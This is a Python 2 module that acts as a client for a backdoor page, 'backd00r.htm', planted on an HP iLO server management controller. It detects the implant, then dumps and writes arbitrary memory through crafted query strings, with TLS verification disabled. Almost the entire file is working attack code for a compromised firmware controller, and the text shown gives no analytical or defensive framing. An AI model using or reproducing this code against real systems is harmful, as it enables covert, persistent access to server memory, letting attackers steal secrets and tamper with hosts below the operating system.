#!/usr/bin/python

import requests
import time

class ModBackdoor():

	def __init__(self, args):
		requests.packages.urllib3.disable_warnings()
		self.ilo_url = "https://" + args.remote_addr
		self.backdoor_url = "%s/backd00r.htm" % self.ilo_url
		self.verbose = args.verbose

	def start(self):
		return True

	def stop(self):
		return True

	def status(self):
		return 1 if self.detect_backdoor() else 0

	def detect_backdoor(self):
		try:
			r = requests.get(self.backdoor_url, verify=False)
		except:
			if self.verbose:
				print "[-] Fail contacting iLO"
			return False
		if r.status_code != 400:
			if self.verbose:
				print "[-] iLO Backdoor not detected"
			return False
		else:
			if self.verbose:
				print "[+] iLO Backdoor found"
			return True

	def dump_memory(self, addr, count):
		start=time.time()
		print "[*] Asked dump of %08x bytes at %016x" % (count, addr)
		asked_count = count
		addr_hi = addr>>32
		if addr_hi > 0x7fffffff:
			addr_hi -= 0x100000000
		addr_lo = addr & 0xffffffff
		if addr_lo > 0x7fffffff:
			addr_lo -= 0x100000000

		if (count % 0x10000) != 0:
			count = count + (0x10000 - (count % 0x10000))

		dump_url = "%s?act=dmp&hiaddr=%x&loaddr=%x&count=%x" % (self.backdoor_url, addr_hi, addr_lo, count)

		r = requests.get(dump_url, verify=False)
		if r.status_code != 200:
			print "[-] Dump failed"
			if len(r.content) > 0:
				print "\t%s" % r.content
				return ""
		print "[+] Dump OK in",(time.time()-start)
		return r.content[:asked_count]

	# Limited by design -> query_string is max 1023 bytes long
	def write_memory_chunk(self, addr, data):
		start=time.time()
		if self.verbose:
			print "[*] Write 0x%x @%016x" % (len(data),addr)
		addr_hi = addr>>32
		if addr_hi > 0x7fffffff:
			addr_hi -= 0x100000000
		addr_lo = addr & 0xffffffff
		if addr_lo > 0x7fffffff:
			addr_lo -= 0x100000000
		write_url = "%s?act=wmem&hiaddr=%x&loaddr=%x&data=%s" % (self.backdoor_url, addr_hi, addr_lo, data.encode("base64").replace("\n","").replace("+","%2B"))
		
		r = requests.get(write_url, verify=False)
		if r.status_code != 200:
			if self.verbose:
				print "[-] Write failed"
			return ""
		if self.verbose:
			print "[+] Write 0x%x in" % len(data),(time.time()-start)
		return r.content

	def write_memory(self, addr, data):
		start=time.time()
		print "[*] Asked write of %08x bytes at %016x" % (len(data), addr)
		wdata = ""
		for x in xrange(0, len(data), 0x200):
			wdata += self.write_memory_chunk(addr+x, data[x:x+0x200])
		print "[+] Write done in",(time.time()-start)
		return wdata

